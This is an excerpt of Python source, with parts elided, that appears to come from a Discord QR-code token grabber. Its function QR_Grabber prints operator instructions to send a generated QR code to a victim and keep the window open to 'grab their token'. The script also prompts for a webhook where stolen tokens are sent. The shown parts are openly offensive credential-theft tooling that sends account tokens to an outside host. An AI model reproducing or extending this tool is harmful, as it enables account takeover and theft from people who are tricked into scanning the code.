...
def QR_Grabber(Webhook):
    ...
    print(" Information: \n")
    print(' Make sure to have this window open to grab their token!')
    print('Send the QR Code to a user and wait for them to scan!')
    print(' QR Code generated in '+os.getcwd()+'\\output\\QR-Code')
...
print("""Enter your WebHook to the channel where the token will be sent: """)
